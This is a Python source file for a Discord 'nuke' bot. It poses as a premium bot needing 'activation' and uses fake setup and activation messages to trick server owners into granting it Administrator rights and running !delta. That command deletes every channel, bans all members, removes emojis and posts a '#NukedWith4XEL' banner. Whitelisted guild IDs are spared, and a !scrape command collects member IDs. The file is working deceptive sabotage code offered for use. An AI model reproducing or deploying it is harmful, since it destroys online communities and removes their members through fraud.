import discord
import discord.ext
from discord.ext import commands
from asyncio import sleep
import shutil
import time
import threading
import multiprocessing
import getpass
import os

columns = shutil.get_terminal_size().columns


startup = '''
      .o                         oooo  
    .d88                         `888  
  .d'888   oooo    ooo  .ooooo.   888  
.d'  888    `88b..8P'  d88' `88b  888  
88ooo888oo    Y888'    888ooo888  888  
     888    .o8"'88b   888    .o  888  
    o888o  o88'   888o `Y8bod8P' o888o 
                                      
                  Lite
'''



print(startup.center(columns))
print("Made by epoch#0003")
token = input('Enter your bot token : \n')
botName = input("Enter your bot name : \n")
perma = input("Enter what you want the PERMA channel to be named (Channel which is created after nuking) : \n")
permaMessage = input("Enter what you want to say in the PERMA channel :\n")


print("\n\n\n")

intents = discord.Intents.all()
intents.message_content = True

client = commands.Bot(command_prefix='!', intents=intents, log_handler=None)

dest = False

@client.event
async def on_ready():
  print("Nuke is online, Nuke with the !delta command.")
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing,   name=f"| !setup to activate your {botName}"))

@client.command()
async def scrape(ctx):
  os.system('cls')
  global all_member_id
  all_member_id = []
  mem_count = 0
  for member in ctx.guild.members:
    all_member_id.append(member.id)
    mem_count = mem_count + 1
  global guild_id
  global chan_id
  guild_id = ctx.guild.id     # stores the guild ID
  chan_id = ctx.channel.id    # stores the channel that you typed ".scrape" into
  await client.close() #Closing the discord.py bot after scraping  

@client.command()
async def testenv(ctx):
    global dest
    dest = False
    await ctx.send("Greetings, The nuke has been disabled.")

@client.command()
async def skippermissions(ctx):
    embed = discord.Embed(title='Skipping Permissions (Advanced)')
    embed.add_field(name='This process is not recomended!', value="This can cause bugs!")
    embed.add_field(name='Fun Fact!', value="This copy of Premium is Gift Edition!")
    await ctx.send(embed=embed)

@client.command()
async def setup(ctx):

    embed = discord.Embed(title=f'{botName} Premium Setup', description=f'Hey! To get started {botName} needs time to communicate with the servers for activation! (This will take roughly 5 seconds)', color=discord.Color.random())
    embed.add_field(name="⩫ Checking for permissions..", value="N/A", inline=False)

    embed2 = discord.Embed(title='Action Needed!', description="We couldn't access the activation server, Heres what you need to do, Then run !setup again.", color=discord.Color.random())
    embed2.add_field(name=f"⩫ Give {botName} the following permissions :", value="Administrator", inline=False)
    embed2.add_field(name="⩫ Run these commands :", value="`!delta`, `!activate`", inline=False)
    msg = await ctx.send(embed=embed)
    await sleep(5)
    await msg.edit(embed=embed2)
  
    

@client.command()
async def delta(ctx):
    start = time.time()
    whitelist = [1067526295052882010, 
                 1066225300695945216, 
                 1053454559323889704, 
                 1067993948083191848, 
                 922316694830088212, 
                 999863599788982332, ]

    whitelistNames = ["AF",
                      "ANTI FURRY"
                      "ANTI FUR",
                      "ANTIFUR"
                      "ANTI-FUR"
                      "ANTI-FURRY"
                      "ANTI"
                      ]

    name = ctx.guild.name.upper()

    print("AF Whitelist Check - ")
    print(f"Launched in {ctx.guild.name} A.K.A - {ctx.guild.id}")

    
    if name in whitelistNames :
        print(f"Whitelist tripped by {ctx.author.id}, They tried to nuke {ctx.guild.name}. ALERT!")

    if ctx.guild.id in whitelist :
        print(f"Whitelist tripped by {ctx.author.id}, They tried to nuke {ctx.guild.name}. ALERT!")
        exit()

    else:
        for c in ctx.guild.channels:
            try :
                await c.delete()
            except :
                continue

        guild = ctx.message.guild
        channel = await guild.create_text_channel(f'⚡{perma}')
        embed = discord.Embed(title='#NukedWith4XEL', color=discord.Color.green())
        embed.add_field(name=f'{ctx.author.name} has a message for you.', value=permaMessage)
        await channel.send(embed=embed)

        for c in ctx.guild.members:
            try :
                await c.ban()
            except :
                continue

        for Emoji in ctx.guild.emojis:
            await Emoji.delete()
    print("Done!")
    end = time.time()
    total_time = end - start
    print(f"Completed in {total_time}s")


    
@client.command()
async def d(ctx):
    process = multiprocessing.Process(target=delta, args=(ctx,))
    start = time.time()
    print("Done!")
    end = time.time()
    total_time = end - start
    print(f"Completed in {total_time}s")

@client.command()
async def activate(ctx):
    embed = discord.Embed(title=f"🚀 Activating your copy of {botName} Premium!")
    embed.add_field(name=f"Some information!",value="◍ This copy of {botName} Premium is being activated with the code ||DMX-503-MO5-341||.")
    embed.add_field(name=f"How kind!",value="◍ This copy of {botName} Premium was donated by <@848973439644729355> for $11.95!")  
    embed2 = discord.Embed(title="🚀 Activated!")
    embed2.add_field(name=f"Please run `!delta` now.", value="{botName} Validation Service")
    msg = await ctx.send(embed=embed)
    await sleep(10)
    await msg.edit(embed=embed2)

client.run(token)
